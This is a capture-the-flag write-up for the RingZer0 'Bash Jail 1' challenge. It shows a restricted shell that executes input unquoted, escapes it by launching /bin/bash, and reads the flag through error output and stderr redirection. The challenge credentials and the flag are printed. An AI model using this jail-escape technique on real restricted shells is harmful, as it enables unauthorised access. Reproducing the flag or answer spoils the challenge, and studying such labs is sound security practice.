# Bash Jail 1
https://ringzer0ctf.com/challenges/218

We get an SSH host, port, username and password.

## Writeup
Connect with:
```
ssh level1@challenges.ringzer0ctf.com -p 10218
```
And input password: level1

We are greeted with:
```bash
RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=2001(level1) gid=2001(level1) groups=2001(level1),1000(challenger)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

echo
echo "Flag is located at $(pwd)/flag.txt"
echo
echo "Challenge bash code:"
echo "-----------------------------"
echo -e '\033[0;31m'
sed -e '1,19d' < $0
echo -e '\033[0m'
echo "-----------------------------"

# CHALLENGE

while :
do
        echo "Your input:"
        read input
        output=`$input`
done

-----------------------------
```
And we get "Your input" but no terminal prompt:
```bash
Your input:
`
/home/level1/prompt.sh: line 36: `: command not found
Your input:
ls
Your input:
```

`read` takes whatever we give it and stores it into the `input` variable, which is then assigned to `ouput`, but with backticks we actually execute what was in `input`. Inputting only a a backtick produces an error because a backtick is not a command that can be executed. But `ls` is.

But the ouput of `ls` is not displayed. I started playing with how the code works, that is:

```bash
$ read input
ls
$ $input
projects1
...
$ `$input`
projects1: command not found
```
So the output of the `ls` command was stored (a list of folders in the current directory), and when $input was put into backticks, it tried to execute the first line of the output (so it tried execute the name of the first directory like a command).

Then I thought: maybe I can get a normal shell somehow, and lo and behold:
```bash
Your input:
/bin/sh
sh-4.3$ ls
```
I wasn't sure that would have worked, but hey, it did. 

Still no output though. `/bin/sh` is a very basic shell, so I Ctrl+D'd out of it and:
```
Your input:
/bin/bash
level1@jail-bash:~$ ls
level1@jail-bash:~$ cat flag.txt
```
I was trying random things and just seeing if one of them works.
<img src="./images/random-meme.jpg" max-height=400px max-width=400px>

Since I can't see standard output, maybe I could pipe to standard error?

But then, another thought came to my mind following my `ls` experiments: I could create a new file which filename would be the contents of flag.txt, and then use bash's autocomplete to fill out the name, since autocomplete worked with the `flag.txt` file.
```bash
level1@jail-bash:~$ $(cat flag.txt)
Traceback (most recent call last):
  File "/usr/lib/command-not-found", line 27, in <module>
    from CommandNotFound.util import crash_guard
ModuleNotFoundError: No module named 'CommandNotFound'
level1@jail-bash:~$ echo $(cat flag.txt)
level1@jail-bash:~$ touch $(cat flag.txt)
touch: cannot touch 'FLAG-U96l4k6m72a051GgE5EN0rA85499172K': Read-only file system
```
Not what I expected to happen, but I have the flag :muscle:

## Other writepus

While trying out things for the challenge, and following the "I could redirect to standard error" thought, I looked up a few links around stdout and stderr and stumbled on [stdout & stderr in bash script](https://medium.com/@mrpadigala/stdout-stderr-in-bash-script-801cebddacc3) which says:
```
./your_script.sh > output.log 2>&1

The 2>&1 part in the command redirects standard error (stderr) (file descriptor 2) to the same location as standard output (stdout) (file descriptor 1).

Here’s how it works in detail:

>: Redirects standard output (stdout) to the specified file, output.log in this case.
2>: Redirects standard error (stderr) to a location.
&1: Specifies that stderr should go to wherever stdout is currently going (i.e., output.log).
Without 2>&1, only the standard output would go to output.log, and any errors would still appear on the terminal. Adding 2>&1 means both stdout and stderr are combined in the same log file, giving you a complete output of the script.
```
This describes how to get stderr in a file, I wanted to get stderr in stdout. In the back of my mind I thought "I'd have to reverse it" but I also got the other idea :point_up:.

It's funny really, because most writeups went the "redirect stdout to stderr" way, which seems quite strightforward. 

A file descriptor is a process integer identifier for an open input/ouput resource like a file, pipe, network socket. 0 is standard input, 1 is standard output, 2 is standard error.

Other writeup's solution:
```
Your input:
/bin/bash
level1@jail-bash:~$ cat flag.txt 1>&2
FLAG-U96l4k6m72a051GgE5EN0rA85499172K
```
Stdout filedescriptor is `1`. `>` redirects standard output of `cat flag.txt` to standard error `&2`, so file descriptor 2. `&` means: treat the following number as a file descriptor, not as a filename.

Also a good [intro to file descriptors](https://dev.to/sebastianmarines/understanding-linuxs-file-descriptors-a-deep-dive-into-21-and-redirection-4g5h).